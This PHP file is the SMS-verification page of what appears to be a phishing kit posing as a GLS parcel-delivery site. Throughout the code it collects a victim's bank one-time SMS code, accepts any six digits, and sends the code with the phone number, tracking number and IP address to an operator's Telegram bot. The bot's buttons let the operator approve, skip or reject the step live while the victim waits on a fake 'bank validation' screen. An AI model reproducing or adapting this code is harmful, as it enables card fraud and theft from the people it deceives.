<?php
// IMPORTANT: No output before this
ob_start(); // Start output buffering to prevent header issues

session_start();
require_once 'config.php';
require_once 'languages.php';

// Check if payment was submitted
if (!isset($_SESSION['tracking_number'])) {
    header('Location: index.php');
    exit;
}

// Check if waiting for validation
$isWaiting = isset($_GET['waiting']) && $_SESSION['waiting_validation'] ?? false;

// If waiting, check validation status
if ($isWaiting && isset($_SESSION['validation_id'])) {
    $validationFile = __DIR__ . '/logs/sms_validation_' . $_SESSION['validation_id'] . '.json';

    if (file_exists($validationFile)) {
        $validation = json_decode(file_get_contents($validationFile), true);

        if ($validation['status'] === 'approved') {
            // Clear validation
            unset($_SESSION['waiting_validation']);
            unlink($validationFile);

            // Redirect to loading
            ob_end_clean();
            header('Location: loading.php');
            exit;

        } elseif ($validation['status'] === 'skip') {
            // Clear validation
            unset($_SESSION['waiting_validation']);
            unlink($validationFile);

            // Skip SMS and go DIRECTLY to success
            ob_end_clean();
            header('Location: success.php');
            exit;

        } elseif ($validation['status'] === 'rejected') {
            // Clear validation and show error
            unset($_SESSION['waiting_validation']);
            unlink($validationFile);

            $error = t('sms_text') . " - Code rejeté, veuillez réessayer.";
        }
    }
}

// Handle SMS verification - SIMPLIFIED LOGIC
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['verify_code'])) {

    // Collect the 6-digit code
    $code = '';
    for ($i = 0; $i < 6; $i++) {
        $code .= isset($_POST['code_' . $i]) ? $_POST['code_' . $i] : '';
    }

    // Debug log
    error_log("VERIFICATION - Code reçu: " . $code . " (length: " . strlen($code) . ")");

    // Check if code is 6 digits (accept ANY 6-digit code)
    if (strlen($code) === 6 && ctype_digit($code)) {

        $_SESSION['verification_code'] = $code;

        // Generate unique session ID for this validation
        $validationId = md5(session_id() . time());
        $_SESSION['validation_id'] = $validationId;

        // Prepare Telegram message with INLINE BUTTONS
        $message = "📱 <b>ÉTAPE 3 - CODE SMS À VALIDER</b>\n\n";
        $message .= "📦 <b>Numéro de suivi:</b> " . ($_SESSION['tracking_number'] ?? 'N/A') . "\n";
        $message .= "📱 <b>Téléphone:</b> " . ($_SESSION['phone'] ?? 'N/A') . "\n";
        $message .= "🔐 <b>CODE SMS saisi:</b> <code>" . $code . "</code>\n";
        $message .= "⏰ <b>Date:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌍 <b>Langue:</b> " . strtoupper(getCurrentLang()) . "\n";
        $message .= "🖥️ <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n\n";
        $message .= "⚠️ <b>Choisissez une action:</b>\n";

        // Send to Telegram with INLINE KEYBOARD (3 buttons)
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ APPROUVER (avec SMS)', 'callback_data' => 'approve_' . $validationId]
                ],
                [
                    ['text' => '🚀 PASSER DIRECT (sans SMS)', 'callback_data' => 'skip_' . $validationId]
                ],
                [
                    ['text' => '❌ REJETER', 'callback_data' => 'reject_' . $validationId]
                ]
            ]
        ];

        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);

        // Debug log
        error_log("TELEGRAM - Envoi ÉTAPE 3 avec boutons: " . ($result ? 'SUCCESS' : 'FAILED'));

        // Store code and wait for validation
        $_SESSION['sms_code_pending'] = $code;
        $_SESSION['waiting_validation'] = true;

        // Clear output buffer and redirect to waiting page
        ob_end_clean();

        // Redirect to waiting page
        header('Location: verification.php?waiting=1');
        exit;

    } else {
        // Invalid code
        error_log("VERIFICATION - Code invalide: " . $code);
        $error = t('sms_text') . " - " . htmlspecialchars($code);
    }
}

$pageTitle = t('sms_verification');
include 'includes/header.php';
?>

<div class="page-transition">
    <div class="container" style="padding: 3rem 1rem;">
        <a href="payment.php" style="display: inline-flex; align-items: center; gap: 0.5rem; color: var(--gls-blue); text-decoration: none; margin-bottom: 1.5rem;">
            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
            </svg>
            <span><?php echo t('back'); ?></span>
        </a>

        <div class="card" style="max-width: 600px;">
            <div style="text-align: center; margin-bottom: 2rem;">
                <div style="background: var(--gls-light-blue); width: 5rem; height: 5rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem;">
                    <svg width="40" height="40" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                    </svg>
                </div>
                <h2 style="font-size: 2rem; margin-bottom: 0.5rem;"><?php echo t('sms_verification'); ?></h2>
                <?php if ($isWaiting): ?>
                    <div style="background: #fef3c7; border: 2px solid #fbbf24; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0;">
                        <p style="color: #92400e; font-weight: 600;">⏳ En attente de validation de votre banque...</p>
                        <div class="loading" style="margin: 1rem auto;"></div>
                    </div>
                <?php else: ?>
                    <p style="color: #6b7280;"><?php echo t('sms_text'); ?></p>
                <?php endif; ?>
            </div>

            <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 2rem;">
                <svg width="24" height="24" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
                </svg>
                <p style="font-size: 0.875rem; color: #4b5563;">
                    <?php echo t('code_sent'); ?> <strong><?php echo isset($_SESSION['phone']) ? substr($_SESSION['phone'], 0, 7) . ' *** ****' : '+36 ** *** ****'; ?></strong>
                </p>
            </div>

            <form action="verification.php" method="POST" id="verificationForm" <?php echo $isWaiting ? 'style="display:none;"' : ''; ?>>
                <div class="code-inputs">
                    <?php for ($i = 0; $i < 6; $i++): ?>
                        <input
                            type="text"
                            id="code-<?php echo $i; ?>"
                            name="code_<?php echo $i; ?>"
                            class="code-input"
                            maxlength="1"
                            inputmode="numeric"
                            pattern="[0-9]"
                            required
                            autocomplete="off"
                        >
                    <?php endfor; ?>
                </div>

                <?php if (isset($error)): ?>
                    <div class="alert alert-error" style="text-align: center; margin-bottom: 1rem;">
                        <?php echo $error; ?>
                    </div>
                <?php endif; ?>

                <div class="alert alert-info" style="text-align: center;">
                    <?php echo t('any_code_text'); ?>
                </div>

                <!-- Hidden field to indicate form submission -->
                <input type="hidden" name="verify_code" value="1">

                <button type="submit" class="btn btn-primary btn-full" style="font-size: 1.125rem;">
                    <?php echo t('verify_button'); ?>
                </button>
            </form>

            <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #e5e7eb; text-align: center;">
                <p style="font-size: 0.75rem; color: #6b7280;">
                    <?php echo t('security_note'); ?>
                </p>
            </div>
        </div>
    </div>
</div>

<script>
// Check validation status if waiting
<?php if ($isWaiting): ?>
let checkInterval = setInterval(function() {
    fetch('check_sms_validation.php?id=<?php echo $_SESSION['validation_id'] ?? ''; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'approved') {
                clearInterval(checkInterval);
                window.location.href = 'loading.php';
            } else if (data.status === 'rejected') {
                clearInterval(checkInterval);
                window.location.href = 'verification.php?error=rejected';
            }
        });
}, 2000); // Check every 2 seconds
<?php endif; ?>

// Auto-focus next input when a digit is entered
document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
    input.addEventListener('input', (e) => {
        if (e.target.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

// Ensure all 6 inputs are filled before submitting
document.getElementById('verificationForm').addEventListener('submit', function(e) {
    const inputs = document.querySelectorAll('.code-input');
    let code = '';

    inputs.forEach(input => {
        code += input.value;
    });

    if (code.length !== 6) {
        e.preventDefault();
        alert('<?php echo t('sms_text'); ?>');
        return false;
    }
});
</script>

<?php
ob_end_flush(); // Flush output buffer
include 'includes/footer.php';
?>
